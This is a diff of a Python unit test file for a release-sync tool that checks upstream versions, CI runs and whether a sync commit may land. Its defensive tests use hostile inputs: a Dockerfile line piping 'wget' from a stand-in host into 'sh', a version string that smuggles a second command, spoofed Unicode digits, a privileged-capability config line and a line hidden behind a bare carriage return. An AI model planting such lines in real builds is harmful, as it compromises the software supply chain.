@@ -39,6 +39,10 @@ def index(*platforms: tuple[str, str], media: str = upstream_sync.INDEX_TYPES[0]
 BOTH = index(("linux", "amd64"), ("linux", "arm64"))
 
 
+PUBLISHED = "2026-10-23T09:01:39Z"
+PUBLISHED_AT = 1792746099.0  # PUBLISHED as a timestamp
+
+
 class FakeUpstream:
     """GitHub's latest-release endpoint and GHCR's token + manifest endpoints, in memory."""
 
@@ -48,7 +52,8 @@ class FakeUpstream:
 
     def __call__(self, url: str, headers: dict[str, str]) -> bytes:
         if url.endswith("/releases/latest"):
-            return json.dumps({"tag_name": self.tag, "draft": False, "prerelease": False}).encode()
+            return json.dumps({"tag_name": self.tag, "draft": False, "prerelease": False,
+                               "published_at": PUBLISHED}).encode()
         if "/token?" in url:
             return b'{"token": "t"}'
         for part, repo in upstream_sync.IMAGES.items():
@@ -79,7 +84,8 @@ class Versions(unittest.TestCase):
         self.assertGreater(upstream_sync.parse_version("1.4.10"), upstream_sync.parse_version("1.4.9"))
 
     def test_only_plain_releases(self):
-        for bad in ("1.4", "1.4.2-rc1", "v1.4.2", "1.4.2; true", ""):
+        # The last is Arabic-Indic digits: \\d matches them, and int() reads them as 1.4.2.
+        for bad in ("1.4", "1.4.2-rc1", "v1.4.2", "1.4.2; true", "", "\u0661.\u0664.\u0662"):
             with self.subTest(bad=bad), self.assertRaises(upstream_sync.SyncError):
                 upstream_sync.parse_version(bad)
 
@@ -182,10 +188,14 @@ class Index(unittest.TestCase):
 
 class Check(Tree):
     HEAD = "c" * 40
+    TIP = "e" * 40
 
-    def check(self, upstream=None, tried=None):
+    def check(self, upstream=None, tried=None, run=None, now=PUBLISHED_AT + 600):
         return upstream_sync.check(self.root, upstream or FakeUpstream(), "", tried or (lambda b: None),
-                                   self.HEAD)
+                                   self.HEAD, lambda sha: run, now)
+
+    def tried_here(self, branch):
+        return self.HEAD, self.TIP
 
     def test_proposes_a_newer_release_with_both_images(self):
         out = self.check()
@@ -199,6 +209,13 @@ class Check(Tree):
             with self.subTest(manifests=manifests):
                 out = self.check(FakeUpstream(manifests=manifests))
                 self.assertEqual(out["action"], "wait")
+                self.assertNotIn("report", out)
+
+    def test_reports_images_still_missing_hours_later(self):
+        out = self.check(FakeUpstream(manifests={"api": index(("linux", "amd64")), "web": BOTH}),
+                         now=PUBLISHED_AT + upstream_sync.STALLED_AFTER + 3600)
+        self.assertEqual(out["action"], "wait")
+        self.assertIn("opengym-api still does not serve", out["report"])
 
     def test_nothing_when_current(self):
         for tag in ("v1.4.1", "v1.4.0"):
@@ -210,18 +227,95 @@ class Check(Tree):
         self.assertEqual(out["action"], "none")
         self.assertIn("re-published opengym-api, opengym-web:1.4.1", out["reason"])
 
-    def test_skips_a_version_already_tried_on_this_main(self):
-        out = self.check(tried=lambda branch: self.HEAD)
+    def ci(self, status="completed", conclusion=""):
+        return {"status": status, "conclusion": conclusion, "url": "https://example.invalid/run/1"}
+
+    def test_waits_while_ci_tests_it(self):
+        for status in ("queued", "in_progress", "waiting"):
+            with self.subTest(status=status):
+                out = self.check(tried=self.tried_here, run=self.ci(status))
+                self.assertEqual(out["action"], "none")
+                self.assertNotIn("report", out)
+
+    def test_a_failed_run_is_not_retried_on_the_same_main(self):
+        out = self.check(tried=self.tried_here, run=self.ci(conclusion="failure"))
         self.assertEqual(out["action"], "none")
-        self.assertIn("already made from this main", out["reason"])
+        self.assertIn("ended failure", out["report"])
+
+    def test_a_cancelled_or_timed_out_run_is_reported_not_dropped(self):
+        for conclusion in ("cancelled", "timed_out", "startup_failure"):
+            with self.subTest(conclusion=conclusion):
+                out = self.check(tried=self.tried_here, run=self.ci(conclusion=conclusion))
+                self.assertEqual(out["action"], "none")
+                self.assertIn(f"ended {conclusion}", out["report"])
+
+    def test_a_passed_run_is_left_to_land(self):
+        out = self.check(tried=self.tried_here, run=self.ci(conclusion="success"))
+        self.assertEqual(out["action"], "none")
+        self.assertNotIn("report", out)
+
+    def test_a_dispatch_that_started_no_run_is_made_again(self):
+        self.assertEqual(self.check(tried=self.tried_here, run=None)["action"], "propose")
 
     def test_retries_once_main_moved(self):
-        self.assertEqual(self.check(tried=lambda branch: "d" * 40)["action"], "propose")
+        out = self.check(tried=lambda branch: ("d" * 40, self.TIP), run=self.ci(conclusion="failure"))
+        self.assertEqual(out["action"], "propose")
 
     def test_rejects_an_odd_tag(self):
-        for tag in ("v1.4.2-rc1", "1.4.2", "latest", None):
+        for tag in ("v1.4.2-rc1", "1.4.2", "latest", None, "v1.4.\u0663"):
             with self.subTest(tag=tag), self.assertRaises(upstream_sync.SyncError):
                 self.check(FakeUpstream(tag=tag))
+
+
+class CiRun(unittest.TestCase):
+    SHA = "a" * 40
+
+    def lookup(self, body: dict):
+        seen = []
+
+        def fetch(url, headers):
+            seen.append(url)
+            return json.dumps(body).encode()
+        return upstream_sync.ci_run(fetch, "", "Amantux/opengym-ha", self.SHA), seen
+
+    def test_the_newest_dispatched_run_of_that_commit(self):
+        run, seen = self.lookup({"workflow_runs": [{"status": "completed", "conclusion": "failure",
+                                                    "html_url": "https://github.com/x/y/actions/runs/1"}]})
+        self.assertEqual(run, {"status": "completed", "conclusion": "failure",
+                               "url": "https://github.com/x/y/actions/runs/1"})
+        self.assertIn(f"head_sha={self.SHA}&event=workflow_dispatch", seen[0])
+
+    def test_none_started(self):
+        self.assertIsNone(self.lookup({"workflow_runs": []})[0])
+
+    def test_refuses_odd_input(self):
+        for repo, sha in (("Amantux/opengym-ha", "HEAD"), ("a/b?x=1", self.SHA)):
+            with self.subTest(repo=repo, sha=sha), self.assertRaises(upstream_sync.SyncError):
+                upstream_sync.ci_run(lambda u, h: b"{}", "", repo, sha)
+
+
+class TriedOn(Tree):
+    """A real remote: what `check` reads to know whether this main already tried a release."""
+
+    def git(self, cwd: Path, *args: str) -> str:
+        return subprocess.run(["git", "-C", str(cwd), "-c", "user.name=t", "-c", "user.email=t@t", *args],
+                              check=True, capture_output=True, text=True).stdout.strip()
+
+    def test_the_main_a_branch_was_made_from_and_its_tip(self):
+        origin = Path(self._tmp.name) / "origin.git"
+        clone = Path(self._tmp.name) / "clone"
+        self.git(self.root, "init", "-q", "-b", "main")
+        self.git(self.root, "add", "-A")
+        self.git(self.root, "commit", "-q", "-m", "main")
+        main = self.git(self.root, "rev-parse", "HEAD")
+        self.git(self.root, "checkout", "-q", "-b", "upstream/opengym-1.4.2")
+        self.git(self.root, "commit", "-q", "--allow-empty", "-m", "sync")
+        tip = self.git(self.root, "rev-parse", "HEAD")
+        subprocess.run(["git", "init", "-q", "--bare", "-b", "main", str(origin)], check=True)
+        self.git(self.root, "push", "-q", str(origin), "main", "upstream/opengym-1.4.2")
+        subprocess.run(["git", "clone", "-q", "--depth=1", f"file://{origin}", str(clone)], check=True)
+        self.assertEqual(upstream_sync.tried_on(clone, "upstream/opengym-1.4.2"), (main, tip))
+        self.assertIsNone(upstream_sync.tried_on(clone, "upstream/opengym-9.9.9"))
 
 
 class Landable(Tree):
@@ -280,6 +374,13 @@ class Landable(Tree):
         self.assertEqual(self.landable(self.candidate(extra=extra)), 1)
         self.assertIn("opengym-entrypoint.sh", self.stderr)
 
+    def test_another_changed_file_is_refused(self):
+        def extra():
+            path = self.root / "opengym/config.yaml"
+            path.write_text(path.read_text() + "privileged: [SYS_ADMIN]\n")
+        self.assertEqual(self.landable(self.candidate(extra=extra)), 1)
+        self.assertIn("changes more than a sync commit may: opengym/config.yaml", self.stderr)
+
     def test_an_extra_dockerfile_line_is_refused(self):
         # The Dockerfile is code: a sync commit may change its pins and nothing else.
         def extra():
@@ -287,6 +388,22 @@ class Landable(Tree):
             path.write_text(path.read_text() + "RUN wget -O- http://example.invalid | sh\n")
         self.assertEqual(self.landable(self.candidate(extra=extra)), 1)
         self.assertIn("is not what a sync to 1.4.2 makes", self.stderr)
+
+    def test_a_line_hidden_behind_a_bare_cr_is_refused(self):
+        # Docker reads `# comment\rENTRYPOINT ...` as one comment line; decoded text would not.
+        def extra():
+            path = self.root / addon_lint.DOCKERFILE
+            data = path.read_bytes()
+            assert b"\nCOPY --from=web" in data
+            path.write_bytes(data.replace(b"\nCOPY --from=web", b"\rCOPY --from=web", 1))
+        self.assertEqual(self.landable(self.candidate(extra=extra)), 1)
+        self.assertIn("is not what a sync to 1.4.2 makes", self.stderr)
+
+    def test_a_mode_change_is_refused(self):
+        def extra():
+            (self.root / addon_lint.DOCKERFILE).chmod(0o755)
+        self.assertEqual(self.landable(self.candidate(extra=extra)), 1)
+        self.assertIn("100644 -> 100755", self.stderr)
 
     def test_an_edited_changelog_is_refused(self):
         def extra():
